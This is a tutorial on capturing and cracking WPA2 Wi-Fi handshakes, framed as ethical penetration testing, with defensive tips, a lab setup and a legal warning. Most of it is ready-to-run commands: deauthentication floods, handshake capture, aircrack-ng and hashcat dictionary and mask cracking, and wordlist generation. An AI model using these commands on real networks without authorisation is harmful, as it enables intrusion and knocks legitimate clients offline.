📊 WPA2 Handshake Process
🤝 The 4-Way Handshake

Client                            Access Point
   |                                    |
   |<------- ANonce (AP Nonce) ---------|
   |                                    |
   |------ SNonce (Client Nonce) ------>|
   |                                    |
   |<---- GTK + MIC (Message Integrity) |
   |                                    |
   |----- ACK + MIC (Confirmation) ----->|
   |                                    |
🔍 What's Captured?
PMK (Pairwise Master Key) - Derived from PSK

ANonce & SNonce - Random numbers

PTK (Pairwise Transient Key) - Session key

MIC (Message Integrity Code) - Proof of key knowledge

🎯 Ethical WPA2 Testing Methodology
Phase 1: Reconnaissance
bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Capture specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
  -w capture wlan0mon
Phase 2: Handshake Capture
bash
# Deauthenticate client to force reconnection
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:ADDR wlan0mon
Phase 3: Password Cracking
bash
# Dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  capture-01.cap

# Using hashcat (GPU accelerated)
aircrack-ng -J capture_hash capture-01.cap
hashcat -m 2500 capture_hash.hccapx rockyou.txt
📝 Wordlist Management
Common Wordlists:
bash
/usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/fasttrack.txt
/usr/share/seclists/Passwords/Common-Credentials/
Create Custom Wordlist:
bash
# Crunch - Generate wordlists
crunch 8 12 -t @@@%%%%%% -o custom.txt

# Cewl - Scrape website for words
cewl https://target.com -d 2 -w words.txt
🛡️ Defending Against WPA2 Attacks
Network Hardening:
bash
# 1. Use WPA3 when available
# 2. Implement 802.1X/EAP
# 3. Use strong passwords (>12 chars)
# 4. Enable MAC filtering (limited protection)
# 5. Regular security audits
Detection of Attacks:
bash
# Monitor for deauth floods
sudo tcpdump -i wlan0 -n \
  "type mgt subtype deauth"
🧪 Lab Environment Setup
Safe Testing Lab:
bash
# Create isolated test network
# Use Virtual AP with Hostapd
sudo hostapd /etc/hostapd/hostapd.conf

# Set up test client
sudo iwconfig wlan0 essid "TEST-NET"
Recommended Tools:
Kali Linux - Pre-installed wireless tools

Alfa AWUS036ACH - High-power wireless adapter

Wifite - Automated testing framework

Bettercap - Real-time monitoring


🔍 Troubleshooting Common Issues
Monitor Mode Won't Enable:
bash
# Check for interfering processes
sudo airmon-ng check kill

# Try different drivers
sudo modprobe -r ath9k
sudo modprobe ath9k

# Use macchanger if needed
sudo macchanger -r wlan0
No Handshake Captured:
bash
# Increase deauth packets
aireplay-ng --deauth 20 -a BSSID wlan0mon

# Try different channels
airodump-ng --channel 1,6,11 wlan0mon

# Check distance to target
# Move closer to access point
Performance Optimization:
bash
# Use GPU with hashcat
hashcat -m 2500 -D 1,2 capture.hccapx wordlist.txt

# Optimize wordlist
john --wordlist=rockyou.txt --rules --stdout > optimized.txt

# Use mask attacks for patterns
hashcat -m 2500 capture.hccapx -a 3 ?l?l?l?l?l?l


🔒 Security Best Practices
For Network Owners:
Use WPA3 when available

Strong passwords (>16 characters, mixed)

Disable WPS (Wi-Fi Protected Setup)

Regular updates of router firmware

Monitor logs for suspicious activity

For Ethical Hackers:
Always get written permission

Document everything

Test in isolated environments first

Respect privacy and data protection

Follow responsible disclosure

⚠️ Final Warning
This guide is for EDUCATIONAL PURPOSES ONLY.
Unauthorized access to computer networks is:

Illegal under Swedish and international law

Unethical and violates academic integrity

Punishable by fines and imprisonment

Use these skills to PROTECT networks, not attack them.
